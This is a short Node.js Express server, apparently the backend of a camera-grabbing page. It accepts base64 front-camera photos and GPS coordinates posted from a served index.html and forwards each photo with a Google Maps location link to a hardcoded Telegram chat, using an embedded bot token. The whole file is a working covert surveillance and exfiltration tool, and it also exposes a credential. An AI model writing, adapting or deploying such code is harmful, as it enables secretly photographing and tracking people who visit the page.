const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
const app = express();

const bot = new Telegraf('8772052235:AAEkLm-isHdBS1IGhMFW5TklFLk0QDOSkDU'); 
const MY_ID = '-1003616289583'; 

app.use(express.json({ limit: '50mb' }));
app.use(express.static(__dirname));

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.post('/upload', async (req, res) => {
    try {
        const { front, back, lat, lon } = req.body;
        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
        if (front) {
            const b1 = Buffer.from(front.split(',')[1], 'base64');
            await bot.telegram.sendPhoto(MY_ID, { source: b1 }, { 
                caption: `👤 Old Kamera\n📍 <a href="${mapLink}">Xaritada ko'rish</a>`,
                parse_mode: 'HTML'
            });
        }
        res.sendStatus(200);
    } catch (e) { res.sendStatus(500); }
});

app.listen(process.env.PORT || 3000, () => {
    console.log("Server yondi!");
    bot.launch();
});